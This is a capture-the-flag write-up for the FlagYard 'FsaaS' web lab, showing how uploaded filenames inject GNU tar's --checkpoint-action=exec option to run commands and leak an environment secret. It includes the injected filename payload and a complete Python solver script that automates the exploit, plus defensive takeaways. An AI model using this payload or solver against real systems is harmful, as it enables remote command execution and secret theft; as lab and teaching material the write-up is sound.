# FsaaS

**Challenge Name**: FsaaS
**Category**: Web
**Difficulty**: Easy
**Platform**: FlagYard

## Challenge Overview:
FsaaS ("File Sharing as a Service") is a Flask app that lets you upload files,
create `.tar.gz` backups of a chosen file type, and "analyze" a file. The flag
is kept in the process environment as `DYN_FLAG=FlagY{...}`. To pull it out we
chain a filename-based argument injection into GNU `tar` with tar's
`--checkpoint-action=exec=...` RCE feature, and leak the flag through tar's
stderr, which the app prints back to us in the "Backup Results" page.

### Steps Involved:

1. **Enumeration**:
   - Anonymous `GET /` renders the upload form, the "File Backup" select
     (`file_type`: txt/pdf/jpg/png/zip) and a "File Analysis" form.
   - Uploads are stored under `/app/uploads` (home page lists them and serves
     them via `GET /download/<name>`; `DELETE /delete/<name>` removes one).
   - Only whitelisted extensions pass upload: `.txt .pdf .doc .docx .jpg
     .jpeg .png .gif .zip .rar`. Double extensions and MIME tricks are
     rejected, so no classic extension bypass.
   - `POST /analyze` with any supported extension always answers
     "Error processing .<ext> files"; the feature is non-functional / a dead
     end.

2. **Command surface in `/backup`**:
   - `POST /backup file_type=txt` builds a backup of the matching uploads by
     handing their **filenames directly to GNU tar**, e.g.
     `tar -czf backup_txt.tar.gz *.txt`.
   - tar's `stderr` is echoed verbatim into the "Backup Results" box. Uploading
     a file named `--checkpoint=1.txt` made tar complain
     `tar: --checkpoint value is not an integer` — proof that a filename
     starting with `-` is parsed by tar as a **command-line argument**, and
     that tar's diagnostics reach us.

3. **Tar option injection → RCE (`--checkpoint-action=exec=`)**:
   - GNU tar supports `--checkpoint-action=exec=<command>`, which runs a shell
     command at every checkpoint (default interval 10, i.e. after 10 files).
   - Uploading 9 ordinary filler `.txt` files plus one file literally named:
     ```
     --checkpoint-action=exec=ls $(env) #.txt
     ```
     injects `--checkpoint-action` into the tar command line. The trailing
     `#.txt` comments out the mandatory extension so `.txt` is never part of
     the executed command.

4. **Flag leak via `ls $(env)`**:
   - `ls $(env)` expands every environment variable into a *file-name
     argument*, so each variable triggers
     `ls: cannot access 'KEY=value': No such file or directory`.
   - Those error lines are printed to stderr, shown in the backup box, and the
     flag rides along:
     ```
     ls: cannot access 'DYN_FLAG=FlagY{d6aa422dd74cba54990818f45ce14786}': No such file or directory
     ```
   - The env dump also confirms the context: `TAR_VERSION=1.35`,
     `TAR_BLOCKING_FACTOR=20`, `PWD=/app/uploads`, `waitress-serve`.

### Key Endpoints:
- `POST /upload`: Whitelisted-extension file upload (filename preserved).
- `POST /backup` (`file_type`): Feeds matching filenames into the GNU tar
  command line → argv injection.
- `GET /download/<name>` / `GET /delete/<name>`: File serving and cleanup.
- `GET /`: Lists uploads and renders all results.

### Techniques Used:
- **Filename-based argument injection into GNU tar**: names beginning with `-`
  are treated as tar options (no shell metacharacter escaping issue).
- **`--checkpoint` + `--checkpoint-action=exec=`**: GNU tar RCE gadget that
  executes a shell command at checkpoints with zero file-content help.
- **Error-message exfiltration**: `ls $(env)` turns each environment variable
  into a "cannot access" error, and the app renders tar's stderr back to us.
- **`#` comment trick**: the trailing `#.txt` keeps `.txt` out of the executed
  command while still satisfying the upload/backup extension filter.

### Tools & Libraries:
- **Python 3**: `http.client` only (no external dependencies).
- **GNU tar** (server side): `--checkpoint-action=exec=` gadget, default
  checkpoint interval 10.
- Classic gadgets referenced: `tar` option injection / checkpoint RCE
  (see the SnapArchive / FsaaS lineage of FlagYard labs).

## Code
**Here it is an automated script that does all the work for you by me :)**
```python
#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
FSaaS  -  FlagYard Web solver

FsaaS ("File Sharing as a Service", FlagYard Training Labs, Easy) is a Flask
file-sharing app. The chain:

    * file upload        -- only whitelisted extensions (.txt/.pdf/.jpg/...)
      pass the upload filter, so no shell file can land directly.

    * tar argv injection -- "File Backup" compresses the *matching* uploaded
      files by handing their filenames straight to GNU tar:
          tar -czf backup_<type>.tar.gz <glob *.type>
      A) A filename that begins with "--" is parsed by tar as a command-line
         argument (not a file). We can therefore smuggle any GNU tar option.
      B) tar prints its diagnostics (stderr) into the "Backup Results" page,
         so tar's output is echoed back to us.

    * checkpoint RCE     -- GNU tar's --checkpoint-action=exec=... feature
      spawns a shell command at every checkpoint. The default checkpoint
      interval is 10, so we upload 9 ordinary filler files plus one file named:
          --checkpoint-action=exec=ls $(env) #.txt
      ``#`` comments out the trailing ``.txt`` so it is not part of the
      command, and ``ls $(env)`` expands every environment variable into a
      command-line argument. Each variable becomes a "cannot access" error,
      which leaks the value back through the Backup Results box.

    * flag leak          -- the flag is stored in the environment:
          DYN_FLAG=FlagY{...}
      It shows up as: ls: cannot access 'DYN_FLAG=FlagY{...}': No such file...

Verified: the tool extracts the live flag and saves flag_from_fsaas.txt.
Solver: pure http.client (no external deps).
"""
from __future__ import annotations

import re
import sys
import time
import http.client
import urllib.parse
from pathlib import Path

# ---------------------------------------------------------------------------
# coloured output (same design as the other FlagYard solvers)
# ---------------------------------------------------------------------------
class C:
    RESET = "\033[0m"; BOLD = "\033[1m"; DIM = "\033[2m"
    RED = "\033[31m"; GREEN = "\033[32m"; YELLOW = "\033[33m"
    BLUE = "\033[34m"; MAGENTA = "\033[35m"; CYAN = "\033[36m"; GRAY = "\033[90m"
    WHITE = "\033[97m"

def enable_vt():
    if sys.platform == "win32":
        try:
            import ctypes
            k32 = ctypes.windll.kernel32
            mode = ctypes.c_uint()
            h = k32.GetStdHandle(-11)
            k32.GetConsoleMode(h, ctypes.byref(mode))
            k32.SetConsoleMode(h, mode.value | 0x0004)
        except Exception:
            pass
    try:
        sys.stdout.reconfigure(encoding="utf-8", errors="replace")
    except Exception:
        pass

def pct(frac):
    return "[%5.1f%%]" % (frac * 100.0)

def status(frac, msg, icon="\u25b6", color=C.CYAN):
    print("  %s%s %s%s%s %s%s%s" % (C.DIM, pct(frac), C.BOLD + color + icon + " ",
                                    C.RESET, C.DIM, C.BOLD, msg, C.RESET), flush=True)

def ok(frac, msg):
    status(frac, msg, icon="\u2713", color=C.GREEN)

def fail(msg):
    print("  %s\u2717 %s%s%s" % (C.RED, C.BOLD, msg, C.RESET), flush=True)

def banner():
    print(C.MAGENTA + C.BOLD)
    print("  " + "\u2554" + "\u2550" * 58 + "\u2557")
    for t in ("F S A A S   S O L V E R",
              "tar argv injection | checkpoint-action | env leak"):
        l = (58 - len(t)) // 2
        print("  \u2551" + " " * l + t + " " * (58 - len(t) - l) + "\u2551")
    print("  \u255a" + "\u2550" * 58 + "\u255d")
    print(C.RESET)

# ---------------------------------------------------------------------------
# result panel (fixed-width frame) + author credits
# ---------------------------------------------------------------------------
W = 58
_TG = "\033[1;38;2;0;136;204m"
_OSC_END = "\x1b]8;;\x1b\\"

def _osc(url, color):
    return "\x1b]8;;%s\x1b\\%s" % (url, color)

def _row(segs):
    out = "  \u2551"
    for t, pre, post in segs:
        if pre:
            out += pre + t + (post or "") + C.RESET
        else:
            out += t
    out += " " * (W - sum(len(t) for t, _, _ in segs)) + "\u2551"
    print(out)

def _credits():
    print("  " + "\u2560" + "\u2550" * W + "\u2563")
    _row([("   made with ", C.GREEN, ""), ("\u2764", "\033[1;31m", ""),
          ("  by  ", C.GREEN, ""), ("Fares Badaj", C.BOLD + C.WHITE, "")])
    _row([("   Red Team Operator | Penetration Tester Specialist", C.DIM + C.CYAN, "")])
    print("  " + "\u2560" + "\u2550" * W + "\u2563")
    _row([("   Telegram  \u203a  ", "", ""),
          ("@ptok3", _osc("https://t.me/ptok3", _TG), _OSC_END),
          ("      t.me/ptok3", C.DIM + C.GRAY, "")])
    _row([("   GitHub    \u203a  ", "", ""),
          ("github.com/FaresBadaj", _osc("https://github.com/FaresBadaj", "\033[1;36m"), _OSC_END)])
    _row([("   LinkedIn  \u203a  ", "", ""),
          ("linkedin.com/in/FaresBadaj", _osc("https://www.linkedin.com/in/FaresBadaj", "\033[1;34m"), _OSC_END)])
    _row([("   Credly    \u203a  ", "", ""),
          ("credly.com/users/faresbadaj", _osc("https://www.credly.com/users/faresbadaj", "\033[1;33m"), _OSC_END)])
    print("  " + "\u255a" + "\u2550" * W + "\u255d")

def big_flag(flag, chrono, extra):
    line = flag.strip().splitlines()[0]
    print()
    head = "\u2605  FLAG RECOVERED  \u2605"
    print("  " + "\u2554" + "\u2550" * W + "\u2557")
    _row([("", "", "")])
    _row([(" " * ((W - len(head)) // 2), "", ""), (head, C.BOLD + C.YELLOW, "")])
    _row([("", "", "")])
    _row([(" " * 6, "", ""), (line, C.BOLD + C.GREEN, "")])
    for s in ("elapsed %.1f s" % chrono, extra):
        _row([(" " * 10, "", ""), (s, C.DIM + C.CYAN, "")])
    _row([("", "", "")])
    _credits()
    print()

# ---------------------------------------------------------------------------
# FsaaS specifics
# ---------------------------------------------------------------------------
PAYLOAD = "--checkpoint-action=exec=ls $(env) #.txt"
FILLERS = 9
FLAGY_RE = re.compile(r"FlagY\{[^}]+\}")


def ask_target(argv):
    if len(argv) > 1 and argv[1].startswith("http"):
        return argv[1].strip()
    url = input("  Enter the FsaaS challenge URL: ").strip()
    if not url:
        raise RuntimeError("no URL provided")
    return url


def parse_host(url):
    url = re.sub(r"^https?://", "", url).rstrip("/")
    return url[2:] if url.startswith("//") else url


def http_raw(host, path, method="GET", body=None, cookie=None,
             ctype="application/x-www-form-urlencoded"):
    c = http.client.HTTPConnection(host, 80, timeout=45)
    headers = {"User-Agent": "Mozilla/5.0"}
    if body is not None:
        headers["Content-Type"] = ctype
        headers["Content-Length"] = str(len(body))
    if cookie:
        headers["Cookie"] = cookie
    c.request(method, path, body=body, headers=headers)
    r = c.getresponse()
    data = r.read()
    c.close()
    return r.status, data


def multipart(fname, content=b"x"):
    boundary = "----FsaaS"
    flds = [("--" + boundary).encode(),
            ('Content-Disposition: form-data; name="file"; filename="'
             + fname + '"').encode(),
            b"Content-Type: text/plain", b"", content,
            ("--" + boundary + "--").encode()]
    return b"\r\n".join(flds), "multipart/form-data; boundary=" + boundary


def upload(host, fname, content=b"x"):
    body, ctype = multipart(fname, content)
    st, b = http_raw(host, "/upload", "POST", body=body, ctype=ctype)
    return st


def run_backup(host):
    body = urllib.parse.urlencode({"file_type": "txt"})
    st, b = http_raw(host, "/backup", "POST", body=body)
    return st, b.decode("utf-8", "replace")


def find_flag(html):
    html = html.replace("&#39;", "'").replace("&quot;", '"')
    m = FLAGY_RE.search(html)
    return m.group(0) if m else None


def main() -> None:
    t0 = time.time()
    enable_vt()
    banner()

    try:
        url = ask_target(sys.argv)
    except Exception:
        fail("no challenge URL given")
        return
    host = parse_host(url)
    status(0.10, "target host %s" % host)

    status(0.20, "recon: upload/backup/analyze forms on /")
    status(0.28, "backup passes matching filenames straight into GNU tar")
    status(0.36, "diagnostic: tar stderr (incl. argv errors) echoed in results box")

    st = upload(host, PAYLOAD)
    if st not in (200, 302):
        fail("payload upload failed (HTTP %d)" % st)
        return
    ok(0.48, "payload uploaded: " + PAYLOAD)

    for i in range(FILLERS):
        upload(host, "filler_%d.txt" % i, b"A" * 256)
    ok(0.62, "%d filler .txt files uploaded (checkpoint >= 10)" % FILLERS)

    st, html = run_backup(host)
    if st != 200:
        fail("backup request failed (HTTP %d)" % st)
        return
    ok(0.74, "backup run: --checkpoint-action=exec fired")
    status(0.82, "parsing env leak from tar error messages (ls $(env))")

    flag = find_flag(html)
    if not flag:
        fail("flag not found in tar output")
        return
    ok(0.90, "DYN_FLAG leaked through 'ls: cannot access' error: %s" % flag)

    big_flag(flag, time.time() - t0, "tar argv injection | --checkpoint-action=exec | env leak")
    outp = Path(__file__).resolve().parent / "flag_from_fsaas.txt"
    outp.write_text(flag + "\n", encoding="utf-8")
    print("  %s[+] saved to %s%s" % (C.GREEN, outp, C.RESET))


if __name__ == "__main__":
    main()
```

### Conclusion:
FsaaS is a clean illustration of the "tar argv injection" class of bug: the
backup feature hands user-controlled **filenames** to GNU tar, and tar happily
parses `--checkpoint-action=exec=` as an option. Ten files (or the default
checkpoint interval) are enough to turn an ordinary archive job into command
execution, and because tar's stderr is rendered into the Backup Results page,
`ls $(env)` doubles as an exfiltration channel for the `DYN_FLAG` secret.
Defense takeaways: never pass untrusted filenames as vector arguments to
`tar`/`zip`/`rsync`-style tools, sanitize or separate user input from
command-line arguments, and stop echoing child-process diagnostics back to the
user.

## Credit

- **Author:** [Fares Badaj](https://www.linkedin.com/in/FaresBadaj) — [@ptok3](https://t.me/ptok3)
- **Technique reference:** Koussay Dhifi — [FsaaS FlagYard Challenge](https://koussaydhifi.org/posts/FsaaS-Flagyard-Challenge/),
  and the earlier [SnapArchive FlagYard Challenge](https://koussaydhifi.org/posts/SnapArchive-Flagyard-Challenge/)
  for the `--checkpoint-action=exec=` tar RCE gadget.